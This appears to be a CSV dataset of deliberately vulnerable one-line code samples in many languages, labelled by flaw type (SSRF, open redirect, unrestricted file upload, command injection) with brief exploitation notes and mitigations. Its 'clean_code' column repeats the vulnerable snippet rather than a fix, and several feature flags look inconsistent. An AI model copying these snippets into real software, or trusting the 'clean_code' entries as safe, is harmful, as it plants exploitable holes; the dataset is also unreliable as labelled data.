id,language,vulnerability_type,description,code_snippet,exploitation_techniques,mitigation,clean_code,has_user_input,has_db_operation,has_file_operation,has_eval,code_length,has_validation,has_quotes,has_concatenation,vuln_category,vul
vuln-807,Go,Server-Side Request Forgery (SSRF),Unrestricted URL fetching.,"resp, _ := http.Get(r.URL.Query().Get(""url""))",Request internal or restricted endpoints.,"Validate: if isAllowedUrl(r.URL.Query().Get(""url"")) { http.Get(...) }","resp, _ := http.Get(r.URL.Query().Get(""url""))",True,True,False,False,45,False,True,False,Other,1
vuln-808,C# (.NET),Server-Side Request Forgery (SSRF),Unvalidated URL in HTTP requests.,"var response = await httpClient.GetAsync(request.Query[""url""]);",Access internal network resources.,"Validate: if (IsValidUrl(request.Query[""url""])) await httpClient.GetAsync(...)","var response = await httpClient.GetAsync(request.Query[""url""]);",True,True,False,False,63,False,True,False,Other,1
vuln-809,Kotlin,Server-Side Request Forgery (SSRF),Unrestricted URL fetching.,"val response = http.get(call.parameters[""url""]!!)",Access internal or sensitive endpoints.,"Validate: if (isValidUrl(call.parameters[""url""])) http.get(...)","val response = http.get(call.parameters[""url""]!!)",True,False,False,False,49,False,True,False,Other,1
vuln-810,Scala,Server-Side Request Forgery (SSRF),Unvalidated URL requests.,"val response = WS.url(params(""url"")).get()",Access internal services or localhost.,"Validate: if (isValidUrl(params(""url""))) WS.url(...).get()","val response = WS.url(params(""url"")).get()",True,False,False,False,42,False,True,False,Other,1
vuln-811,Rust,Server-Side Request Forgery (SSRF),Unrestricted URL fetching.,"let resp = reqwest::get(req.param(""url"")?).await?;",Request internal or restricted endpoints.,"Validate: if is_allowed_url(req.param(""url"")?) { reqwest::get(...).await? }","let resp = reqwest::get(req.param(""url"")?).await?;",True,False,False,False,50,False,True,False,Other,1
vuln-812,Elixir,Server-Side Request Forgery (SSRF),Unvalidated URL requests.,"{:ok, response} = HTTPoison.get(params[""url""])",Access internal services or localhost.,"Validate: if is_valid_url(params[""url""]) do HTTPoison.get(...) end","{:ok, response} = HTTPoison.get(params[""url""])",True,False,False,False,46,False,True,False,Other,1
vuln-813,Perl,Server-Side Request Forgery (SSRF),Unrestricted URL fetching.,my $response = LWP::UserAgent->new->get($r->param('url'));,Access internal or sensitive endpoints.,Validate: if (is_allowed_url($r->param('url'))) { LWP::UserAgent->new->get(...) },my $response = LWP::UserAgent->new->get($r->param('url'));,True,False,False,False,58,False,True,False,Other,1
vuln-814,Node.js,Insecure Redirects,Unvalidated redirect URLs.,res.redirect(req.query.redirect);,Redirect users to malicious sites.,Validate: if (isSafeUrl(req.query.redirect)) res.redirect(req.query.redirect),res.redirect(req.query.redirect);,True,True,False,False,33,False,False,False,Other,1
vuln-815,Python,Insecure Redirects,Unvalidated redirect URLs.,return redirect(request.args.get('redirect')),Redirect to phishing or malicious sites.,Validate: if is_safe_url(request.args.get('redirect')): redirect(...),return redirect(request.args.get('redirect')),False,False,False,False,45,False,True,False,Other,1
vuln-816,Java,Insecure Redirects,Unvalidated redirect URLs.,"response.sendRedirect(request.getParameter(""redirect""));",Redirect users to malicious domains.,"Validate: if (isSafeUrl(request.getParameter(""redirect""))) response.sendRedirect(...)","response.sendRedirect(request.getParameter(""redirect""));",True,False,False,False,56,False,True,False,Other,1
vuln-817,PHP,Insecure Redirects,Unvalidated redirect URLs.,header('Location: ' . $_GET['redirect']);,Redirect to malicious sites.,Validate: if (is_safe_url($_GET['redirect'])) header('Location: ' . $_GET['redirect']);,header('Location: ' . $_GET['redirect']);,False,False,False,False,41,False,True,False,Other,1
vuln-818,Ruby,Insecure Redirects,Unvalidated redirect URLs.,redirect_to params[:redirect],Redirect users to phishing sites.,Validate: redirect_to params[:redirect] if is_safe_url(params[:redirect]),redirect_to params[:redirect],True,False,False,False,29,False,False,False,Other,1
vuln-819,Go,Insecure Redirects,Unvalidated redirect URLs.,"http.Redirect(w, r, r.URL.Query().Get(""redirect""), http.StatusFound)",Redirect to malicious domains.,"Validate: if isSafeUrl(r.URL.Query().Get(""redirect"")) { http.Redirect(...) }","http.Redirect(w, r, r.URL.Query().Get(""redirect""), http.StatusFound)",True,True,False,False,68,False,True,False,Other,1
vuln-820,C# (.NET),Insecure Redirects,Unvalidated redirect URLs.,"return Redirect(Request.Query[""redirect""]);",Redirect users to malicious sites.,"Validate: if (IsSafeUrl(Request.Query[""redirect""])) return Redirect(...)","return Redirect(Request.Query[""redirect""]);",True,True,False,False,43,False,True,False,Other,1
vuln-821,Kotlin,Insecure Redirects,Unvalidated redirect URLs.,"call.respond(redirect(call.parameters[""redirect""]!!))",Redirect to phishing sites.,"Validate: if (isSafeUrl(call.parameters[""redirect""])) call.respond(redirect(...))","call.respond(redirect(call.parameters[""redirect""]!!))",True,False,False,False,53,False,True,False,Other,1
vuln-822,Scala,Insecure Redirects,Unvalidated redirect URLs.,"Redirect(params(""redirect""))",Redirect users to malicious domains.,"Validate: if (isSafeUrl(params(""redirect""))) Redirect(...)","Redirect(params(""redirect""))",True,False,False,False,28,False,True,False,Other,1
vuln-823,Rust,Insecure Redirects,Unvalidated redirect URLs.,"res.redirect(req.param(""redirect"")?)",Redirect to malicious sites.,"Validate: if is_safe_url(req.param(""redirect"")?) { res.redirect(...) }","res.redirect(req.param(""redirect"")?)",True,False,False,False,36,False,True,False,Other,1
vuln-824,Elixir,Insecure Redirects,Unvalidated redirect URLs.,"redirect conn, external: params[""redirect""]",Redirect users to phishing sites.,"Validate: if is_safe_url(params[""redirect""]) do redirect conn, external: params[""redirect""] end","redirect conn, external: params[""redirect""]",True,False,False,False,43,False,True,False,Other,1
vuln-825,Perl,Insecure Redirects,Unvalidated redirect URLs.,$r->headers_out->set('Location' => $r->param('redirect'));,Redirect to malicious domains.,Validate: if (is_safe_url($r->param('redirect'))) { $r->headers_out->set('Location' => ...); },$r->headers_out->set('Location' => $r->param('redirect'));,True,False,False,False,58,False,True,False,Other,1
vuln-826,Node.js,Insecure File Upload,Unrestricted file uploads.,"app.post('/upload', (req, res) => { req.files.file.mv('/uploads/' + req.files.file.name); });",Upload malicious files like webshells.,Validate: if (isSafeFile(req.files.file)) req.files.file.mv(...),"app.post('/upload', (req, res) => { req.files.file.mv('/uploads/' + req.files.file.name); });",True,False,False,False,93,False,True,True,File_Handling,1
vuln-827,Python,Insecure File Upload,No validation on uploaded files.,file = request.files['file']; file.save('uploads/' + file.filename),Upload executable scripts or malware.,Validate: if is_safe_file(file): file.save(...),file = request.files['file']; file.save('uploads/' + file.filename),False,False,False,False,67,False,True,True,File_Handling,1
vuln-828,Java,Insecure File Upload,Unrestricted file uploads.,"MultipartFile file = request.getFile(""file""); file.transferTo(new File(""uploads/"" + file.getOriginalFilename()));",Upload malicious files.,Validate: if (isSafeFile(file)) file.transferTo(...),"MultipartFile file = request.getFile(""file""); file.transferTo(new File(""uploads/"" + file.getOriginalFilename()));",False,False,False,False,113,False,True,True,File_Handling,1
vuln-829,PHP,Insecure File Upload,No validation on uploaded files.,"move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);",Upload executable scripts or webshells.,Validate: if (is_safe_file($_FILES['file'])) move_uploaded_file(...),"move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);",False,False,False,False,86,False,True,False,File_Handling,1
vuln-830,Ruby,Insecure File Upload,Unrestricted file uploads.,"File.write(""uploads/#{params[:file].original_filename}"", params[:file].read)",Upload malicious files.,Validate: File.write(...) if is_safe_file(params[:file]),"File.write(""uploads/#{params[:file].original_filename}"", params[:file].read)",True,False,False,False,76,False,True,False,File_Handling,1
vuln-831,Go,Insecure File Upload,No validation on uploaded files.,"file, header, _ := r.FormFile(""file""); os.WriteFile(""uploads/""+header.Filename, file, 0644)",Upload executable scripts.,Validate: if isSafeFile(header) { os.WriteFile(...) },"file, header, _ := r.FormFile(""file""); os.WriteFile(""uploads/""+header.Filename, file, 0644)",False,False,True,False,91,False,True,True,File_Handling,1
vuln-832,C# (.NET),Insecure File Upload,Unrestricted file uploads.,"var file = Request.Form.Files[0]; await File.WriteAllBytesAsync(""uploads/"" + file.FileName, file.OpenReadStream());",Upload malicious files.,Validate: if (IsSafeFile(file)) await File.WriteAllBytesAsync(...),"var file = Request.Form.Files[0]; await File.WriteAllBytesAsync(""uploads/"" + file.FileName, file.OpenReadStream());",False,False,True,False,115,False,True,True,File_Handling,1
vuln-833,Kotlin,Insecure File Upload,No validation on uploaded files.,"val file = call.receiveMultipart().readPart() as FilePart; File(""uploads/${file.fileName}"").writeBytes(file.streamProvider().readAllBytes())",Upload executable scripts.,Validate: if (isSafeFile(file)) File(...).writeBytes(...),"val file = call.receiveMultipart().readPart() as FilePart; File(""uploads/${file.fileName}"").writeBytes(file.streamProvider().readAllBytes())",False,False,False,False,140,False,True,True,File_Handling,1
vuln-834,Scala,Insecure File Upload,Unrestricted file uploads.,"val file = request.body.asMultipartFormData.get.file(""file"").get; Files.write(Paths.get(""uploads/"" + file.filename), file.ref)",Upload malicious files.,Validate: if (isSafeFile(file)) Files.write(...),"val file = request.body.asMultipartFormData.get.file(""file"").get; Files.write(Paths.get(""uploads/"" + file.filename), file.ref)",True,False,False,False,126,False,True,True,File_Handling,1
vuln-835,Rust,Insecure File Upload,No validation on uploaded files.,"let part = req.multipart()?.next_field()?.await?; fs::write(format!(""uploads/{}"", part.file_name()?), part.bytes()?.await?)?;",Upload executable scripts.,Validate: if is_safe_file(part.file_name()?) { fs::write(...) },"let part = req.multipart()?.next_field()?.await?; fs::write(format!(""uploads/{}"", part.file_name()?), part.bytes()?.await?)?;",True,False,False,False,125,False,True,False,File_Handling,1
vuln-836,Elixir,Insecure File Upload,Unrestricted file uploads.,"file = params[""file""]; File.write(""uploads/#{file.filename}"", file.content)",Upload malicious files.,Validate: if is_safe_file(file) do File.write(...) end,"file = params[""file""]; File.write(""uploads/#{file.filename}"", file.content)",True,False,False,False,75,False,True,False,File_Handling,1
vuln-837,Perl,Insecure File Upload,No validation on uploaded files.,"my $file = $r->upload('file'); open(my $fh, '>', ""uploads/$file->{filename}""); print $fh $file->{content};",Upload executable scripts.,"Validate: if (is_safe_file($file)) { open(my $fh, '>', ...); }","my $file = $r->upload('file'); open(my $fh, '>', ""uploads/$file->{filename}""); print $fh $file->{content};",False,False,True,False,106,False,True,False,File_Handling,1
vuln-838,Node.js,Command Injection,Executing untrusted input in shell commands.,exec(`cat ${req.query.file}`);,Inject malicious commands via input.,Avoid exec: Use safe file reading like fs.readFileSync,exec(`cat ${req.query.file}`);,True,True,False,True,30,False,False,True,Injection,1
vuln-839,Python,Command Injection,Running untrusted input in system commands.,"os.system(f'cat {request.args.get(""file"")}')",Inject arbitrary commands.,"Use safe APIs: open(request.args.get('file'), 'r').read() with validation","os.system(f'cat {request.args.get(""file"")}')",False,False,False,True,44,False,True,False,Injection,1
vuln-840,Java,Command Injection,Executing untrusted input in commands.,"Runtime.getRuntime().exec(""cat "" + request.getParameter(""file""));",Inject malicious commands.,Avoid exec: Use Files.readString(Path.of(file)) with validation,"Runtime.getRuntime().exec(""cat "" + request.getParameter(""file""));",True,True,False,True,65,False,True,True,Injection,1
vuln-841,PHP,Command Injection,Running untrusted input in shell commands.,shell_exec('cat ' . $_GET['file']);,Inject arbitrary commands.,Use safe APIs: file_get_contents($_GET['file']) with validation,shell_exec('cat ' . $_GET['file']);,False,True,False,True,35,False,True,False,Injection,1
vuln-842,Ruby,Command Injection,Executing untrusted input in system commands.,"system(""cat #{params[:file]}"")",Inject malicious commands.,Use safe APIs: File.read(params[:file]) with validation,"system(""cat #{params[:file]}"")",True,False,False,True,30,False,True,False,Injection,1
vuln-843,Go,Command Injection,Running untrusted input in commands.,"exec.Command(""cat"", r.URL.Query().Get(""file"")).Run()",Inject arbitrary commands.,"Use safe APIs: os.ReadFile(r.URL.Query().Get(""file"")) with validation","exec.Command(""cat"", r.URL.Query().Get(""file"")).Run()",True,True,False,True,52,False,True,False,Injection,1
vuln-844,C# (.NET),Command Injection,Executing untrusted input in commands.,"Process.Start(""cmd.exe"", ""/c cat "" + Request.Query[""file""]);",Inject malicious commands.,"Use safe APIs: File.ReadAllText(Request.Query[""file""]) with validation","Process.Start(""cmd.exe"", ""/c cat "" + Request.Query[""file""]);",True,True,False,False,60,False,True,True,Injection,1
